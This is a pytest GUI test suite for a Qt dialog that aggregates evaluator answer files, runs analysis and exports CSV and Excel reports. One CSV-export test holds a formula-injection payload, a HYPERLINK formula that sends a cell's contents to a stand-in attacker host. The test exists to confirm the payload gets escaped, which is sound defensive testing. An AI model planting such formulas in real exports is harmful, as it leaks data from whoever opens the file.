"""Tests for qicom.gui.widgets.aggregation_dialog (AggregationDialog) -
requires a Qt platform. Runs headlessly via QT_QPA_PLATFORM=offscreen, set
in tests/gui/conftest.py.
"""

from __future__ import annotations

from pathlib import Path

import pytest
from message_box_stubs import stub_message_box
from openpyxl import load_workbook
from PySide6.QtWidgets import QMessageBox
from pytestqt.qtbot import QtBot

from qicom.gui import backup_copy as backup_copy_module
from qicom.gui.widgets.aggregation_dialog import AggregationDialog
from qicom.session.evaluation_folder import (
    EvaluationAnswer,
    EvaluationPageInput,
    EvaluationQuestion,
)
from qicom.session.evaluation_package import (
    export_answers,
    load_package_metadata_from_zip,
    save_evaluation_zip,
)
from qicom.session.project_folder import PanelSource
from qicom.session.protected_files import AccessKeyring, new_access_key, protect_package


@pytest.fixture
def dialog(qtbot: QtBot) -> AggregationDialog:
    widget = AggregationDialog()
    qtbot.addWidget(widget)
    return widget


@pytest.fixture(autouse=True)
def _no_blocking_message_boxes(monkeypatch: pytest.MonkeyPatch) -> None:
    stub_message_box(
        monkeypatch, "qicom.gui.widgets.aggregation_dialog", warning=lambda *a, **k: None
    )
    stub_message_box(
        monkeypatch, "qicom.gui.widgets.aggregation_dialog", information=lambda *a, **k: None
    )


@pytest.fixture(autouse=True)
def _stub_backup_copy_prompt(monkeypatch: pytest.MonkeyPatch) -> None:
    """offer_backup_copy (qicom.gui.backup_copy, called after a successful
    Generate Report) shows its own real QMessageBox.question/.information/
    .warning - a *separate* module namespace from aggregation_dialog's own
    QMessageBox, so _no_blocking_message_boxes above does not cover it
    (see this repo's own documented QMessageBox test-hang pitfall: stubs
    are per-importing-module, never global). Defaults to declining the
    backup (StandardButton.No), same as every other QMessageBox.question
    default in this codebase."""
    stub_message_box(
        monkeypatch, backup_copy_module, question=lambda *a, **k: QMessageBox.StandardButton.No
    )
    stub_message_box(monkeypatch, backup_copy_module, information=lambda *a, **k: None)
    stub_message_box(monkeypatch, backup_copy_module, warning=lambda *a, **k: None)


def _make_package(tmp_path: Path, test_id: str = "test-1") -> Path:
    """Builds a self-contained evaluation .zip - what AggregationDialog's
    "Choose Package" file picker opens (see evaluation_package's own
    module docstring)."""
    source_image = tmp_path / "ref.png"
    source_image.write_bytes(b"fake bytes")
    package_zip = tmp_path / "package.zip"
    save_evaluation_zip(
        package_zip,
        test_id=test_id,
        pages=[
            EvaluationPageInput(
                page_id=1,
                title="Page 1",
                questions=[EvaluationQuestion(1, "Q1")],
                panels=[
                    PanelSource(
                        role="reference",
                        path=source_image,
                        explicit_files=None,
                        window_level=None,
                    )
                ],
            )
        ],
        evaluator_id="creator",
        evaluator_display_name="Creator",
        answers=[],
    )
    return package_zip


class TestChoosePackage:
    def test_choosing_a_package_shows_its_summary_and_enables_add_answers(
        self, dialog: AggregationDialog, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        package_zip = _make_package(tmp_path)
        monkeypatch.setattr(
            "qicom.gui.widgets.aggregation_dialog.QFileDialog.getOpenFileName",
            lambda *a, **k: (str(package_zip), "QICOM Evaluation (*.zip)"),
        )

        dialog._on_choose_package()

        assert dialog._package is not None
        assert dialog._package.test_id == "test-1"
        assert "test-1" in dialog._package_label.text()
        assert dialog._add_answers_button.isEnabled()
        assert not dialog._generate_button.isEnabled()

    def test_choosing_an_invalid_file_reports_an_error_and_does_not_enable_add_answers(
        self, dialog: AggregationDialog, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        monkeypatch.setattr(
            "qicom.gui.widgets.aggregation_dialog.QFileDialog.getOpenFileName",
            lambda *a, **k: (str(tmp_path / "does_not_exist.zip"), "QICOM Evaluation (*.zip)"),
        )

        dialog._on_choose_package()

        assert dialog._package is None
        assert not dialog._add_answers_button.isEnabled()


class TestAddAnswerFiles:
    def test_valid_answer_files_from_different_evaluators_are_both_accepted(
        self, dialog: AggregationDialog, tmp_path: Path
    ) -> None:
        package_zip = _make_package(tmp_path)

        dialog._package = load_package_metadata_from_zip(package_zip)

        answers_a = tmp_path / "a.json"
        export_answers(
            answers_a,
            test_id="test-1",
            evaluator_id="A",
            evaluator_display_name="Alice",
            answers=[EvaluationAnswer("comparison", 1, 0, 4)],
            completed=True,
        )
        answers_b = tmp_path / "b.json"
        export_answers(
            answers_b,
            test_id="test-1",
            evaluator_id="B",
            evaluator_display_name="Bob",
            answers=[EvaluationAnswer("comparison", 1, 0, 2)],
            completed=True,
        )

        dialog._add_one_answer_file(answers_a)
        dialog._add_one_answer_file(answers_b)

        assert [a.evaluator_id for a in dialog._answers] == ["A", "B"]
        assert dialog._answers_table.rowCount() == 2

    def test_a_mismatched_test_id_is_listed_with_a_red_flag_not_silently_dropped(
        self, dialog: AggregationDialog, tmp_path: Path
    ) -> None:
        """The whole point of this step: an incompatible file is shown,
        with the reason, rather than disappearing behind a popup - it is
        simply never aggregated."""
        package_zip = _make_package(tmp_path, test_id="test-1")

        dialog._package = load_package_metadata_from_zip(package_zip)

        wrong = tmp_path / "wrong.json"
        export_answers(
            wrong,
            test_id="a-different-test",
            evaluator_id="C",
            evaluator_display_name="Carol",
            answers=[],
            completed=True,
        )

        dialog._add_one_answer_file(wrong)

        assert dialog._answers == []
        assert dialog._answers_table.rowCount() == 1
        assert not dialog._rows[0].check.matches
        assert "test-1" in dialog._answers_table.item(0, 3).toolTip()

    def test_the_same_person_twice_is_counted_once_and_says_so(
        self, dialog: AggregationDialog, tmp_path: Path
    ) -> None:
        """Same evaluator id *and* same name - nothing distinguishes the
        two files, so the second is not counted. It is reported as
        already counted, not as failing to match the questions: those
        answers do match, which is exactly what made the old wording send
        a user hunting for a non-existent incompatibility."""
        dialog._package = load_package_metadata_from_zip(_make_package(tmp_path))
        paths = []
        for name in ("first.json", "second.json"):
            path = tmp_path / name
            export_answers(
                path,
                test_id="test-1",
                evaluator_id="A",
                evaluator_display_name="Alice",
                answers=[EvaluationAnswer("comparison", 1, 0, 4)],
                completed=True,
            )
            paths.append(path)
            dialog._add_one_answer_file(path)

        assert len(dialog._answers) == 1
        assert dialog._rows[1].check.matches
        assert dialog._rows[1].duplicate_of == paths[0]
        assert not dialog._rows[1].aggregatable

    def test_several_named_evaluators_from_one_machine_all_match(
        self, dialog: AggregationDialog, tmp_path: Path
    ) -> None:
        """The reported bug: load_or_create_evaluator_identity issues one
        id per *machine*, so everyone answering on a shared reading
        station shares it - only the first file was accepted and every
        other one was flagged as not matching."""
        dialog._package = load_package_metadata_from_zip(_make_package(tmp_path))
        for evaluator in ("Alice", "Bruno", "Carla"):
            path = tmp_path / f"{evaluator}.json"
            export_answers(
                path,
                test_id="test-1",
                evaluator_id="one-shared-machine",
                evaluator_display_name=evaluator,
                answers=[EvaluationAnswer("comparison", 1, 0, 4)],
                completed=True,
            )
            dialog._add_one_answer_file(path)

        assert all(row.aggregatable for row in dialog._rows)
        # And the statistics, which key on evaluator_id, must see three
        # separate raters rather than one.
        assert len({answers.evaluator_id for answers in dialog._answers}) == 3
        assert [a.evaluator_display_name for a in dialog._answers] == ["Alice", "Bruno", "Carla"]

    def test_reloading_the_same_file_replaces_its_row(
        self, dialog: AggregationDialog, tmp_path: Path
    ) -> None:
        """Re-adding a file after correcting it is normal - it used to
        come back flagged as a duplicate of itself."""
        dialog._package = load_package_metadata_from_zip(_make_package(tmp_path))
        path = tmp_path / "alice.json"
        export_answers(
            path,
            test_id="test-1",
            evaluator_id="A",
            evaluator_display_name="Alice",
            answers=[EvaluationAnswer("comparison", 1, 0, 4)],
            completed=True,
        )
        dialog._add_one_answer_file(path)

        dialog._add_one_answer_file(path)

        assert len(dialog._rows) == 1
        assert dialog._rows[0].aggregatable

    def test_an_answer_file_with_no_results_is_not_aggregated(
        self, dialog: AggregationDialog, tmp_path: Path
    ) -> None:
        dialog._package = load_package_metadata_from_zip(_make_package(tmp_path))
        empty = tmp_path / "empty.json"
        export_answers(
            empty,
            test_id="test-1",
            evaluator_id="A",
            evaluator_display_name="Alice",
            answers=[],
            completed=True,
        )

        dialog._add_one_answer_file(empty)

        assert dialog._answers == []
        assert not dialog._generate_button.isEnabled()

    def test_add_answer_files_menu_action_enables_generate_only_with_valid_files(
        self, dialog: AggregationDialog, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        package_zip = _make_package(tmp_path)

        dialog._package = load_package_metadata_from_zip(package_zip)
        answers_a = tmp_path / "a.json"
        export_answers(
            answers_a,
            test_id="test-1",
            evaluator_id="A",
            evaluator_display_name="Alice",
            answers=[EvaluationAnswer("comparison", 1, 0, 4)],
            completed=True,
        )
        monkeypatch.setattr(
            "qicom.gui.widgets.aggregation_dialog.QFileDialog.getOpenFileNames",
            lambda *a, **k: ([str(answers_a)], "JSON (*.json)"),
        )
        assert not dialog._run_analysis_button.isEnabled()

        dialog._on_add_answer_files()

        # Analysis unlocks on matching answers; export only once the
        # analysis has actually produced something.
        assert dialog._run_analysis_button.isEnabled()
        assert not dialog._generate_button.isEnabled()

        dialog._run_analysis()

        assert dialog._generate_button.isEnabled()
        assert dialog._export_csv_button.isEnabled()


class TestAnonymousSubmissions:
    def test_an_anonymous_submission_is_labelled_by_when_it_was_sent(
        self, dialog: AggregationDialog, tmp_path: Path
    ) -> None:
        """With no name to show, the submission id's own timestamp is what
        tells one anonymous response from another."""
        from qicom.session.evaluation_package import new_submission_id

        dialog._package = load_package_metadata_from_zip(_make_package(tmp_path))
        path = tmp_path / "anon.json"
        export_answers(
            path,
            test_id="test-1",
            evaluator_id=new_submission_id(),
            evaluator_display_name=None,
            answers=[EvaluationAnswer("comparison", 1, 0, 4)],
            completed=True,
        )

        dialog._add_one_answer_file(path)

        label = dialog._rows[0].evaluator_label
        assert "Anonymous" in label
        assert dialog._rows[0].aggregatable

    def test_two_anonymous_submissions_are_two_evaluators(
        self, dialog: AggregationDialog, tmp_path: Path
    ) -> None:
        """The reason submission ids exist: the same person, or the same
        machine, submitting twice must not collapse into one rater."""
        from qicom.session.evaluation_package import new_submission_id

        dialog._package = load_package_metadata_from_zip(_make_package(tmp_path))
        for index in range(2):
            path = tmp_path / f"anon{index}.json"
            export_answers(
                path,
                test_id="test-1",
                evaluator_id=new_submission_id(),
                evaluator_display_name=None,
                answers=[EvaluationAnswer("comparison", 1, 0, 4)],
                completed=True,
            )
            dialog._add_one_answer_file(path)

        assert all(row.aggregatable for row in dialog._rows)
        assert len({answers.evaluator_id for answers in dialog._answers}) == 2


class TestExcelAnswerFiles:
    def test_an_excel_report_is_accepted_and_aggregated(
        self, dialog: AggregationDialog, tmp_path: Path
    ) -> None:
        """Reported gap: "when the folder opens to pick the Excel files
        with the results, I get no way to choose the individual Excel
        files". The evaluator-facing artefact is the report workbook, not
        the JSON answers file, so the workspace has to read it."""
        from qicom.gui.evaluation_export import export_aggregated_report
        from qicom.session.evaluation_aggregation import build_answers_dataframe
        from qicom.session.evaluation_answer_files import read_answer_file

        package_zip = _make_package(tmp_path)
        dialog._package = load_package_metadata_from_zip(package_zip)
        answers_json = tmp_path / "a.json"
        export_answers(
            answers_json,
            test_id="test-1",
            evaluator_id="A",
            evaluator_display_name="Alice",
            answers=[EvaluationAnswer("comparison", 1, 0, 4)],
            completed=True,
        )
        # The real artefact, written by the real exporter: this is exactly
        # the workbook an evaluator ends up holding after "Complete &
        # save", multi-sheet and all.
        report = tmp_path / "alice_report.xlsx"
        export_aggregated_report(
            report,
            build_answers_dataframe(
                dialog._package, [read_answer_file(answers_json).evaluators[0]]
            ),
        )

        dialog._add_one_answer_file(report)

        assert dialog._answers_table.rowCount() == 1
        assert dialog._rows[0].check.matches
        # A tabular file carries no test id of its own - the structural
        # check is what established it belongs here, so the package's own
        # id is adopted for the aggregation that follows.
        assert dialog._answers[0].test_id == "test-1"

        dialog._run_analysis()

        assert dialog._results is not None
        assert len(dialog._results.answers) == 1

    def test_an_unreadable_file_is_refused_outright(
        self, dialog: AggregationDialog, tmp_path: Path
    ) -> None:
        dialog._package = load_package_metadata_from_zip(_make_package(tmp_path))
        junk = tmp_path / "notes.txt"
        junk.write_text("not an answers file")

        dialog._add_one_answer_file(junk)

        assert dialog._answers_table.rowCount() == 0


class TestAnalysisStep:
    def test_running_the_analysis_fills_every_table_and_the_chart(
        self, dialog: AggregationDialog, tmp_path: Path
    ) -> None:
        dialog._package = load_package_metadata_from_zip(_make_package(tmp_path))
        for evaluator in ("A", "B"):
            path = tmp_path / f"{evaluator}.json"
            export_answers(
                path,
                test_id="test-1",
                evaluator_id=evaluator,
                evaluator_display_name=evaluator,
                answers=[EvaluationAnswer("comparison", 1, 0, 4)],
                completed=True,
            )
            dialog._add_one_answer_file(path)

        dialog._run_analysis()

        assert dialog._results is not None
        assert dialog._analysis_tables["summary"].rowCount() > 0
        assert dialog._analysis_tables["by_evaluator"].rowCount() > 0
        assert dialog._chart_widget.plotItem.items

    def test_a_red_flagged_evaluation_never_reaches_the_analysis(
        self, dialog: AggregationDialog, tmp_path: Path
    ) -> None:
        dialog._package = load_package_metadata_from_zip(_make_package(tmp_path))
        good = tmp_path / "good.json"
        export_answers(
            good,
            test_id="test-1",
            evaluator_id="A",
            evaluator_display_name="Alice",
            answers=[EvaluationAnswer("comparison", 1, 0, 4)],
            completed=True,
        )
        wrong = tmp_path / "wrong.json"
        export_answers(
            wrong,
            test_id="a-different-test",
            evaluator_id="B",
            evaluator_display_name="Bob",
            answers=[EvaluationAnswer("comparison", 1, 0, 2)],
            completed=True,
        )
        dialog._add_one_answer_file(good)
        dialog._add_one_answer_file(wrong)

        dialog._run_analysis()

        assert dialog._results is not None
        assert list(dialog._results.answers["evaluator_id"].unique()) == ["A"]


class TestExportCsv:
    def test_writes_one_csv_per_non_empty_table(
        self, dialog: AggregationDialog, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        dialog._package = load_package_metadata_from_zip(_make_package(tmp_path))
        answers = tmp_path / "a.json"
        export_answers(
            answers,
            test_id="test-1",
            evaluator_id="A",
            evaluator_display_name="Alice",
            answers=[EvaluationAnswer("comparison", 1, 0, 4)],
            completed=True,
        )
        dialog._add_one_answer_file(answers)
        dialog._run_analysis()
        out_dir = tmp_path / "csv"
        out_dir.mkdir()
        monkeypatch.setattr(
            "qicom.gui.widgets.aggregation_dialog.QFileDialog.getExistingDirectory",
            lambda *a, **k: str(out_dir),
        )

        dialog._on_export_csv()

        written = sorted(path.name for path in out_dir.glob("*.csv"))
        assert "qicom_answers.csv" in written
        assert "qicom_summary.csv" in written

    def test_untrusted_evaluator_text_cannot_become_a_formula(
        self, dialog: AggregationDialog, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        """Answer files come from evaluators and are untrusted; a CSV opened
        in a spreadsheet executes a cell that starts with a formula marker."""
        import csv

        payload = '=HYPERLINK("http://attacker.invalid/?x="&A2,"details")'
        dialog._package = load_package_metadata_from_zip(_make_package(tmp_path))
        answers = tmp_path / "a.json"
        export_answers(
            answers,
            test_id="test-1",
            evaluator_id="A",
            evaluator_display_name=payload,
            answers=[EvaluationAnswer("comparison", 1, 0, 4, free_text="@SUM(1+1)")],
            completed=True,
        )
        dialog._add_one_answer_file(answers)
        dialog._run_analysis()
        out_dir = tmp_path / "csv"
        out_dir.mkdir()
        monkeypatch.setattr(
            "qicom.gui.widgets.aggregation_dialog.QFileDialog.getExistingDirectory",
            lambda *a, **k: str(out_dir),
        )

        dialog._on_export_csv()

        with (out_dir / "qicom_answers.csv").open(encoding="utf-8", newline="") as stream:
            cells = [cell for row in csv.reader(stream) for cell in row]
        assert "'" + payload in cells
        assert "'@SUM(1+1)" in cells
        assert not any(cell.startswith(("=", "@", "+")) for cell in cells)


class TestGenerateReport:
    def test_generates_a_readable_workbook_from_the_added_answer_files(
        self, dialog: AggregationDialog, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        package_zip = _make_package(tmp_path)

        dialog._package = load_package_metadata_from_zip(package_zip)
        answers_a = tmp_path / "a.json"
        export_answers(
            answers_a,
            test_id="test-1",
            evaluator_id="A",
            evaluator_display_name="Alice",
            answers=[EvaluationAnswer("comparison", 1, 0, 4)],
            completed=True,
        )
        dialog._add_one_answer_file(answers_a)
        report_path = tmp_path / "report.xlsx"
        monkeypatch.setattr(
            "qicom.gui.widgets.aggregation_dialog.QFileDialog.getSaveFileName",
            lambda *a, **k: (str(report_path), "Excel (*.xlsx)"),
        )

        dialog._on_generate_report()

        workbook = load_workbook(report_path)
        assert "Raw Answers" in workbook.sheetnames
        assert "Summary" in workbook.sheetnames


class TestDeblindingMapsPerDelivery:
    """One author map per blinded delivery, chosen together: each delivery
    randomised its own presentation, so one map cannot de-blind another."""

    @staticmethod
    def _map(path: Path, delivery_id: str) -> Path:
        import json

        path.write_text(
            json.dumps(
                {
                    "qicom_deblinding_version": 1,
                    "test_id": "t",
                    "delivery_id": delivery_id,
                    "pages": [],
                }
            )
        )
        return path

    def _choose(
        self, dialog: AggregationDialog, monkeypatch: pytest.MonkeyPatch, paths: list[Path]
    ) -> None:
        from qicom.gui.widgets import aggregation_dialog as module

        monkeypatch.setattr(
            module.QFileDialog,
            "getOpenFileNames",
            lambda *a, **k: ([str(path) for path in paths], ""),
        )
        dialog._on_choose_deblinding_map()

    def test_every_delivery_map_is_kept(
        self, dialog: AggregationDialog, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from qicom.i18n import translator

        maps = [self._map(tmp_path / f"d{n}.json", f"reader-{n}") for n in (1, 2)]

        self._choose(dialog, monkeypatch, maps)

        assert [m["delivery_id"] for m in dialog._deblinding_maps] == ["reader-1", "reader-2"]
        assert dialog._choose_deblinding_button.text() == translator.tr(
            "aggregation_dialog.deblinding_loaded_count", count=2
        )

    def test_two_maps_for_one_delivery_are_refused_and_nothing_is_kept(
        self, dialog: AggregationDialog, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        maps = [self._map(tmp_path / f"d{n}.json", "reader-1") for n in (1, 2)]

        self._choose(dialog, monkeypatch, maps)

        assert dialog._deblinding_maps == []


class TestAccessCodes:
    """A protected package, its encrypted answers and its map are
    aggregated only with the access code - asked for once."""

    CODE = "STUDY-CODE-2026"

    def test_the_code_is_asked_once_for_package_and_answers(
        self, dialog: AggregationDialog, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        from qicom.gui.widgets import access_code_dialog

        plain = _make_package(tmp_path)
        access = new_access_key(self.CODE)
        protected = tmp_path / "protected.zip"
        protect_package(plain, protected, access)
        answers = tmp_path / "answers.json"
        export_answers(
            answers,
            test_id="test-1",
            evaluator_id="reader",
            evaluator_display_name="Reader",
            answers=[EvaluationAnswer("reference", 1, 0, 4)],
            completed=True,
            access=access,
        )
        asked: list[str] = []

        def ask(_parent: object, keyring: AccessKeyring, header: object, name: str) -> object:
            known = keyring.key_for(header)  # type: ignore[arg-type]
            if known is not None:
                return known
            asked.append(name)
            return keyring.unlock(header, self.CODE)  # type: ignore[arg-type]

        monkeypatch.setattr(access_code_dialog, "ask_access_key", ask)
        monkeypatch.setattr(
            "qicom.gui.widgets.aggregation_dialog.QFileDialog.getOpenFileName",
            lambda *a, **k: (str(protected), ""),
        )

        dialog._on_choose_package()
        dialog._add_one_answer_file(answers)

        assert dialog._package is not None and dialog._package.test_id == "test-1"
        assert asked == ["protected.zip"]
        assert len(dialog._matching_answers()) == 1

    def test_without_the_code_nothing_is_loaded(
        self, dialog: AggregationDialog, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        from qicom.gui.widgets import access_code_dialog

        protected = tmp_path / "protected.zip"
        protect_package(_make_package(tmp_path), protected, new_access_key(self.CODE))
        monkeypatch.setattr(access_code_dialog, "ask_access_key", lambda *a, **k: None)
        monkeypatch.setattr(
            "qicom.gui.widgets.aggregation_dialog.QFileDialog.getOpenFileName",
            lambda *a, **k: (str(protected), ""),
        )

        dialog._on_choose_package()

        assert dialog._package is None
